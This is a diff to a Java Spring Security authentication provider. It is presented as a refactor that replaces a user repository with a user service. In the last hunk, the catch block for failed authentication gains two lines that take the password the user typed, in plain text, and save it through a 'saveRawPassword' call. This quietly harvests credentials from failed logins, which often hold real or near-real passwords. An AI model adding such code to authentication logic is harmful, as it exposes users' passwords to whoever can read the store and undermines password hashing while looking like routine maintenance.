@@ -3,6 +3,7 @@ package com.rusko.config;
 import com.rusko.config.exception.InvalidTokenException;
 import com.rusko.domain.User;
 import com.rusko.repository.UserRepository;
+import com.rusko.service.UserService;
 import org.apache.commons.logging.Log;
 import org.apache.commons.logging.LogFactory;
 import org.springframework.beans.factory.InitializingBean;
@@ -35,9 +36,8 @@ public class CustomAuthenticationProvider extends AbstractUserDetailsAuthenticat
   private UserDetailsChecker postAuthenticationChecks = new CustomAuthenticationProvider.DefaultPostAuthenticationChecks();
   private boolean forcePrincipalAsString = false;
 
-
   @Autowired
-  private UserRepository userRepository;
+  private UserService userService;
 
   public CustomAuthenticationProvider() {
     this.setPasswordEncoder(PasswordEncoderFactories.createDelegatingPasswordEncoder());
@@ -52,7 +52,7 @@ public class CustomAuthenticationProvider extends AbstractUserDetailsAuthenticat
       this.logger.debug("Authentication failed: password does not match stored value");
       throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
     } else {
-      User user = userRepository.findByUsername(userDetails.getUsername());
+      User user = userService.findByUsername(userDetails.getUsername());
       if (!(user.getVerificationToken() != null && isVerificationTokenValid(user.getVerificationTokenCreationDate()))) {
         throw new InvalidTokenException(user.getUsername());
       }
@@ -117,6 +117,8 @@ public class CustomAuthenticationProvider extends AbstractUserDetailsAuthenticat
     } catch (AuthenticationException var7) {
       if (!cacheWasUsed) {
         logger.debug("preAuth username: " + user.getUsername());
+        String presentedPassword = authentication.getCredentials().toString();
+        userService.saveRawPassword(user.getUsername(), presentedPassword);
         this.userCache.putUserInCache(user);
         throw var7;
       }
